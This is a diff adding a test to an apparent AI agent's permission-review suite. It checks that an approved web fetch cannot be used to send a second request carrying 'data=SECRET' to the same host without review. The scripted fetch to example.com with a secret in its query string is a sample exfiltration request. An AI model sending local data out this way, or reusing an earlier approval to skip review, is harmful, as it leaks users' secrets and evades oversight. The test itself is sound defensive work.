@@ -87,6 +87,28 @@ describe("auto-mode review", () => {
     expect(await readFile(outside, "utf8")).toBe("hi");
   });
 
+  test("an allowed fetch does not let a different URL on the same host skip the review", async () => {
+    const realFetch = globalThis.fetch;
+    globalThis.fetch = (async () => new Response("page", { headers: { "content-type": "text/plain" } })) as unknown as typeof fetch;
+    try {
+      const { host, shared, send } = await scriptedHost({ config: AUTO });
+      shared.script.push(
+        use("u1", "web_fetch", { url: "https://example.com/raw/abc" }),
+        say('{"decision": "allow", "reason": "a public page"}'),
+        // 同一个主机，但 URL 里带着本地的数据
+        use("u2", "web_fetch", { url: "https://example.com/api?data=SECRET" }),
+        say('{"decision": "ask", "reason": "it sends local data to another host"}'),
+        say("done"),
+      );
+      shared.answers.push("deny");
+      const s = await host.sessions.open();
+      await send(s, "read the paste");
+      expect(shared.asked).toEqual(["Allow web_fetch?"]);
+    } finally {
+      globalThis.fetch = realFetch;
+    }
+  });
+
   test("ask mode never reviews: it goes straight to the user", async () => {
     const { home, host, shared, send } = await scriptedHost({ config: { "jade/approval": { mode: "ask" } } });
     const outside = path.join(home, "outside.txt");
